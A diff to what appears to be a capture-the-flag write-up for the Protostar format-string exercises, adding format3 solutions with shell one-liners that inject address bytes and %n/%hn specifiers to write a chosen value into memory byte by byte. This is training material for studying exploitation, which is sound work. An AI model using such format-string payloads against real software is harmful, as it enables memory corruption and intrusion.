@@ -28,8 +28,10 @@
   - [format1: assume no ASLR](#format1-assume-no-aslr)
   - [format1: solution](#format1-solution)
   - [format2: `%n$` and arbitrary write](#format2-n-and-arbitrary-write)
-    - [format2 solution (ultimate)](#format2-solution-ultimate)
-  - [format3](#format3)
+    - [format2 solution (the ultimate)](#format2-solution-the-ultimate)
+  - [format3: write byte by byte](#format3-write-byte-by-byte)
+    - [format3 solution A: 2 bytes write (%n$hn)](#format3-solution-a-2-bytes-write-nhn)
+    - [format3 solution B: 1 byte write (the almighty)](#format3-solution-b-1-byte-write-the-almighty)
   - [format4: plt && got](#format4-plt--got)
 
 ## stack0
@@ -458,7 +460,7 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$52x%5$n')
 ```
 
-### format2 solution (ultimate)
+### format2 solution (the ultimate)
 
 ```bash
 ./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
@@ -466,7 +468,38 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
   # for sh: echo -en $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n') | ./format2
 ```
 
-## format3
+## format3: write byte by byte
 
+```bash
+set SHELL=/bin/bash
+./format3 <<< $(echo -en "AAAA";for i in {0..11};do echo -en "|%.8x";done;)
+./format3 <<< $(echo -en "\xf4\x96\x04\x08";echo -en '%5$16930112x%12$n')
+  # solution 1.
+  # hit, but lengthy.
+  # the target value is 0x0102 5544 -> \x44\x55 \x02\x01
+  # 1st byte: 0x5544, 2nd byte: 0x0102
+```
+
+### format3 solution A: 2 bytes write (%n$hn)
+
+```bash
+  # h: short [signed, unsigned] int
+  # ref: [ibm, format string](https://www.ibm.com/docs/en/i/7.4?topic=functions-printf-print-formatted-characters)
+./format3 <<< $(echo -en "\xf4\x96\x04\x08";echo -en '%5$21824x%12$hn')
+./format3 <<< $(echo -en "\xf6\x96\x04\x08";echo -en '%5$258x%12$hn')
+  # do some adjustment
+./format3 <<< $(echo -en "\xf4\x96\x04\x08\xf6\x96\x04\x08";echo -en '%5$250x%13$hn%5$21570x%12$hn')
+```
+
+### format3 solution B: 1 byte write (the almighty)
+
+```bash
+  # the target value is 0x01025544 -> \x44\x55\x02\x01
+./format3 <<< $(echo -en "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08";echo -en '%5$52x%12$n%5$17x%13$n%5$173x%14$n')
+  # write lowest address first, \x44..., then overwrite the later bytes, step = 1 byte.
+  # 0x01 -> 0x101 -> 257
+  # 0x02 -> 0x102 -> 258
+  # 0x44 -> 0x44 -> 68 + 17 -> 0x55 + 173 -> 0x102, which is 0x02 0x01.
+```
 
 ## format4: plt && got
